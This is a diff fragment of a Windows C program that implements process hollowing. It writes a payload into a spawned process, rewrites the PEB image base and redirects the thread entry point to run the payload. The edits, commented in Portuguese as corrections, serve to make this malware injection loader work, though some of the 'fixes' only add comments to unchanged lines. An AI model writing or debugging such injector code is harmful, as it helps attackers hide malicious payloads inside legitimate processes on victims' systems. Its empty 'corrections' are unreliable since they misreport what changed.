@@ -85,7 +85,7 @@ int main(int argc, char *argv[]) {
     DWORD size = GetFileSize(hPayload, NULL);
     BYTE *buf = HeapAlloc(GetProcessHeap(), 0, size);
     DWORD br;
-    if (!ReadFile(hPayload, buf, size, &br, NULL)) {
+    if (!ReadFile(hPayload, (LPVOID)buf, size, &br, NULL)) { // CORREÇÃO: Cast explícito para LPVOID
         printf("Erro lendo payload\n");
         CloseHandle(hPayload);
         HeapFree(GetProcessHeap(), 0, buf);
@@ -182,16 +182,16 @@ int main(int argc, char *argv[]) {
     // 11. CORRIGIR PEB->ImageBaseAddress PARA APONTAR PARA O NOVO PAYLOAD
     pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
     PROCESS_BASIC_INFORMATION pbi;
-    NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), NULL);
+    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL); // CORREÇÃO: Usar ProcessBasicInformation ao invés de 0
     PVOID baseAddr = (PBYTE)pbi.PebBaseAddress + 0x10; // offset do ImageBaseAddress no PEB
     WriteProcessMemory(pi.hProcess, baseAddr, &remoteImage, sizeof(remoteImage), NULL);
 
     // 12. REDIRECIONAR O ENTRYPOINT PARA O PAYLOAD
     GetThreadContext(pi.hThread, &ctx);
     if (payload64)
-        ctx.Rip = (ULONGLONG)((LPBYTE)remoteImage + nt->OptionalHeader.AddressOfEntryPoint);
+        ctx.Rip = (ULONGLONG)((LPBYTE)remoteImage + nt->OptionalHeader.AddressOfEntryPoint); // CORREÇÃO: Usar Rip para x64
     else
-        ctx.Eip = (DWORD)((LPBYTE)remoteImage + nt->OptionalHeader.AddressOfEntryPoint);
+        ctx.Eip = (DWORD)((LPBYTE)remoteImage + nt->OptionalHeader.AddressOfEntryPoint);   // CORREÇÃO: Usar Eip para x86
     SetThreadContext(pi.hThread, &ctx);
 
     // 13. RETOMAR EXECUÇÃO
